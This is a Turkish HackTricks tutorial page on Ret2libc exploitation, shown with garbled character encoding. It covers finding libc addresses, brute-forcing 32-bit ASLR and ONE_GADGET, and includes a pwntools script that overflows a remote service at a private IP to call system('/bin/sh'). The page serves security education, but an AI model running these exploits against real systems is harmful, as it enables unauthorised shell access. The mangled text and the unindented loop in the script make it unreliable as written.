# Ret2lib

<details>

<summary><strong>SÄ±fÄ±rdan kahraman olmaya kadar AWS hackleme Ã¶ÄŸrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ± gÃ¶rmek istiyorsanÄ±z** veya **HackTricks'i PDF olarak indirmek istiyorsanÄ±z** [**ABONELÄ°K PLANLARI**](https://github.com/sponsors/carlospolop)'na gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* **KatÄ±lÄ±n** ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya bizi **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'da takip edin.**
* **Hacking pÃ¼f noktalarÄ±nÄ±zÄ± paylaÅŸarak PR gÃ¶ndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na katkÄ±da bulunun.

</details>

## **Temel Bilgiler**

**Ret2Libc**'nin Ã¶zÃ¼, zayÄ±f bir programÄ±n yÃ¼rÃ¼tme akÄ±ÅŸÄ±nÄ±, saldÄ±rgan tarafÄ±ndan saÄŸlanan shellcode'Ä±n yÄ±ÄŸÄ±nda yÃ¼rÃ¼tÃ¼lmesi yerine, paylaÅŸÄ±lan bir kÃ¼tÃ¼phane iÃ§indeki bir iÅŸlev (Ã¶rneÄŸin, **system**, **execve**, **strcpy**) iÅŸlevine yÃ¶nlendirmektir. SaldÄ±rgan, geri dÃ¶nÃ¼ÅŸ adresini deÄŸiÅŸtiren bir yÃ¼k oluÅŸturur ve yÄ±ÄŸÄ±nda istenen kÃ¼tÃ¼phane iÅŸlevine iÅŸaret edecek ÅŸekilde ayarlar, aynÄ± zamanda Ã§aÄŸrÄ± konvansiyonuna gÃ¶re gerekli argÃ¼manlarÄ±n da doÄŸru ÅŸekilde ayarlanmasÄ±nÄ± saÄŸlar.

### **Ã–rnek AdÄ±mlar (basitleÅŸtirilmiÅŸ)**

* Ã‡aÄŸrÄ±lacak iÅŸlevin adresini alÄ±n (Ã¶rneÄŸin, system) ve Ã§aÄŸrÄ±lacak komutu (Ã¶rneÄŸin, /bin/sh)
* Ä°lk argÃ¼manÄ± komut dizinine iÅŸaret edecek ÅŸekilde ve yÃ¼rÃ¼tme akÄ±ÅŸÄ±nÄ± iÅŸleve geÃ§irecek ÅŸekilde ROP zinciri oluÅŸturun

## Adresleri Bulma

* KullanÄ±lan `libc`'nin mevcut makineden olduÄŸunu varsayarsak, nerede bellekte yÃ¼kleneceÄŸini aÅŸaÄŸÄ±daki komutla bulabilirsiniz:

{% code overflow="wrap" %}
```bash
ldd /path/to/executable | grep libc.so.6 #Address (if ASLR, then this change every time)
```
{% endcode %}

EÄŸer ASLR'nin libc adresini deÄŸiÅŸtirip deÄŸiÅŸtirmediÄŸini kontrol etmek istiyorsanÄ±z ÅŸunu yapabilirsiniz:
```bash
for i in `seq 0 20`; do ldd ./<bin> | grep libc; done
```
* KullanÄ±lan libc bilindiÄŸinde, `system` iÅŸlevine olan ofseti bulmak da mÃ¼mkÃ¼ndÃ¼r:
```bash
readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system
```
* KullanÄ±lan libc bilindiÄŸinde, `/bin/sh` dizesinin iÅŸlevine olan ofseti bulmak da mÃ¼mkÃ¼ndÃ¼r:
```bash
strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh
```
### gdb-peda / GEF KullanÄ±mÄ±

KullanÄ±lan libc bilindiÄŸinde, Peda veya GEF kullanÄ±larak **system** fonksiyonunun, **exit** fonksiyonunun ve **`/bin/sh`** dizesinin adresini elde etmek de mÃ¼mkÃ¼ndÃ¼r:
```
p system
p exit
find "/bin/sh"
```
### /proc/\<PID>/maps KullanÄ±mÄ±

EÄŸer iÅŸlem her konuÅŸtuÄŸunuzda **Ã§ocuklar** oluÅŸturuyorsa (aÄŸ sunucusu) o dosyayÄ± **okumayÄ±** deneyin (muhtemelen root olmanÄ±z gerekecektir).

Burada iÅŸlem iÃ§inde **libc'nin tam olarak nerede yÃ¼klendiÄŸini** ve iÅŸlemin her Ã§ocuÄŸu iÃ§in **nerede yÃ¼kleneceÄŸini** bulabilirsiniz.

![](<../../../../.gitbook/assets/image (95).png>)

Bu durumda **0xb75dc000** adresine yÃ¼klendi (Bu libc'nin taban adresi olacaktÄ±r)

## Bilinmeyen libc

Binary'nin yÃ¼klediÄŸi libc'yi **bilmediÄŸiniz olabilir** (Ã§Ã¼nkÃ¼ eriÅŸiminiz olmayan bir sunucuda olabilir). Bu durumda zafiyeti **sÄ±zdÄ±rmak iÃ§in kullanabilir ve hangi libc** kÃ¼tÃ¼phanesinin kullanÄ±ldÄ±ÄŸÄ±nÄ± bulabilirsiniz:

{% content-ref url="rop-leaking-libc-address/" %}
[rop-leaking-libc-address](rop-leaking-libc-address/)
{% endcontent-ref %}

Ve bunun iÃ§in bir pwntools ÅŸablonu bulabilirsiniz:

{% content-ref url="rop-leaking-libc-address/rop-leaking-libc-template.md" %}
[rop-leaking-libc-template.md](rop-leaking-libc-address/rop-leaking-libc-template.md)
{% endcontent-ref %}

## 32 bit ASLR'yi Atlatma

Bu brute-force saldÄ±rÄ±larÄ± **yalnÄ±zca 32 bit sistemler iÃ§in** kullanÄ±ÅŸlÄ±dÄ±r.

* EÄŸer saldÄ±rÄ± yerel ise, libc'nin taban adresini brute-force etmeyi deneyebilirsiniz (32 bit sistemler iÃ§in kullanÄ±ÅŸlÄ±dÄ±r):
```python
for off in range(0xb7000000, 0xb8000000, 0x1000):
```
* Uzak bir sunucuya saldÄ±rÄ±rken, `libc` fonksiyonu `usleep` adresini **brute-force** yÃ¶ntemiyle deneyebilirsiniz, Ã¶rneÄŸin 10'u argÃ¼man olarak geÃ§irerek. EÄŸer sunucu cevap vermek iÃ§in 10 saniye daha fazla zaman alÄ±yorsa, bu fonksiyonun adresini buldunuz demektir.

## ONE\_GADGET

[**ONE\_GADGET**](https://github.com/david942j/one\_gadget), **system** ve **"/bin/sh"** kullanmak yerine kabuk elde etmeyi saÄŸlar. **ONE\_GADGET**, sadece bir **ROP adresi** kullanarak kabuk elde etmek iÃ§in libc kÃ¼tÃ¼phanesinde bir yol bulacaktÄ±r.\
Ancak genellikle bazÄ± kÄ±sÄ±tlamalar vardÄ±r, en yaygÄ±n olanlarÄ±ndan ve kolayca kaÃ§Ä±nÄ±labilecek olanlarÄ±ndan biri `[rsp+0x30] == NULL` gibidir. **RSP** iÃ§indeki deÄŸerleri kontrol ettiÄŸinizden, sadece daha fazla NULL deÄŸeri gÃ¶ndererek kÄ±sÄ±tlamayÄ± aÅŸabilirsiniz.

![](<../../../../.gitbook/assets/image (615).png>)
```python
ONE_GADGET = libc.address + 0x4526a
rop2 = base + p64(ONE_GADGET) + "\x00"*100
```
## x86 Ret2lib Kod Ã–rneÄŸi

Bu Ã¶rnekte, kod iÃ§ine ASLR brute-force entegre edilmiÅŸ ve zafiyetli ikili dosya uzak bir sunucuda bulunmaktadÄ±r:
```python
from pwn import *

c = remote('192.168.85.181',20002)
c.recvline()

for off in range(0xb7000000, 0xb8000000, 0x1000):
p = ""
p += p32(off + 0x0003cb20) #system
p += "CCCC" #GARBAGE, could be address of exit()
p += p32(off + 0x001388da) #/bin/sh
payload = 'A'*0x20010 + p
c.send(payload)
c.interactive()
```
## x64 Ret2lib Kod Ã–rneÄŸi

Ã–rneÄŸi kontrol et:

{% content-ref url="../rop-return-oriented-programing.md" %}
[rop-return-oriented-programing.md](../rop-return-oriented-programing.md)
{% endcontent-ref %}

## Ret-into-printf (veya puts)

Bu, `printf`/`puts`'Ä± belirli bir veri ile Ã§aÄŸÄ±rarak iÅŸlemdeki bilgileri sÄ±zdÄ±rmaya olanak tanÄ±r.

## Ret2printf

Bu temelde, bir `printf` format dizesi aÃ§Ä±ÄŸÄ±na dÃ¶nÃ¼ÅŸtÃ¼rmek iÃ§in bir **Ret2lib'i kÃ¶tÃ¼ye kullanmak** anlamÄ±na gelir, `ret2lib`'i kullanarak deÄŸerleri kullanarak printf'i Ã§aÄŸÄ±rmak ve bunu sÃ¶mÃ¼rmek iÃ§in (anlamsÄ±z gibi gÃ¶rÃ¼nse de mÃ¼mkÃ¼ndÃ¼r):

{% content-ref url="../../format-strings/" %}
[format-strings](../../format-strings/)
{% endcontent-ref %}

<details>

<summary><strong>SÄ±fÄ±rdan kahraman olmak iÃ§in AWS hackleme Ã¶ÄŸrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks'i desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ± gÃ¶rmek istiyorsanÄ±z** veya **HackTricks'i PDF olarak indirmek istiyorsanÄ±z** [**ABONELÄ°K PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family'yi**](https://opensea.io/collection/the-peass-family) keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'Ä± takip edin.**
* **Hacking hilelerinizi paylaÅŸarak PR gÃ¶ndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na katkÄ±da bulunun.

</details>
